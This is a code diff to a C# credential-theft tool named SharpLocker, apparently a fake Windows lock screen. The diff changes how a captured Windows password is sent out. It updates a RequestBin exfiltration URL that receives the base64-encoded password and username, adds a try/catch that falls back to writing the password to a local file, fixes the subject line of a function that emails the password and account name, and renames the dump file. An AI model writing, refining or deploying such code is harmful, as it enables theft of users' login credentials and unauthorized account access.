@@ -17,7 +17,7 @@ namespace SharpLocker
             //ExtractWithEmail(password);
 
             //Extract to text file
-            ExtractToFile(password);
+            //ExtractToFile(password);
         }
 
         private static void ExtractWithRequestBin(string password)
@@ -29,7 +29,7 @@ namespace SharpLocker
 
             //YOUR RequestBin link
             //format: http://requestbin.net/r/xxxxxxxx
-            string url = "http://requestbin.net/r/1mf6ngd1";
+            string url = "http://requestbin.net/r/1d8vuu91";
 
             bool EncodeWithBase64 = true;
             bool IncludeUsername = true;
@@ -53,9 +53,17 @@ namespace SharpLocker
                 p = Convert.ToBase64String(plainTextBytes);
             }
 
-            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url + "?" + p);
-            req.GetResponse();
+            try
+            {
+                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url + "?" + p);
+                req.GetResponse();
+            }
 
+            catch (Exception e)
+            { 
+                Console.WriteLine("Exception: " + e.Message);
+                ExtractToFile(p);
+            }
         }
 
         private static void ExtractWithEmail(string password)
@@ -70,7 +78,7 @@ namespace SharpLocker
             //Don't touch this!
             string body = "Password: " + password + " Username&Domain: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name;
 
-            MailMessage msg = new MailMessage(e_address, e_address, "Windwos Password on " + System.Security.Principal.WindowsIdentity.GetCurrent().Name, body);
+            MailMessage msg = new MailMessage(e_address, e_address, "Windows Password on " + System.Security.Principal.WindowsIdentity.GetCurrent().Name, body);
             msg.IsBodyHtml = true;
             SmtpClient sc = new SmtpClient(e_host_addr, e_host_port);
             sc.UseDefaultCredentials = false;
@@ -93,7 +101,7 @@ namespace SharpLocker
 
             try
             {
-                StreamWriter streamWriter = new StreamWriter($"{path}\\pwn.txt");
+                StreamWriter streamWriter = new StreamWriter($"{path}\\password.txt");
                 streamWriter.WriteLine(text);
                 streamWriter.Close();
             }
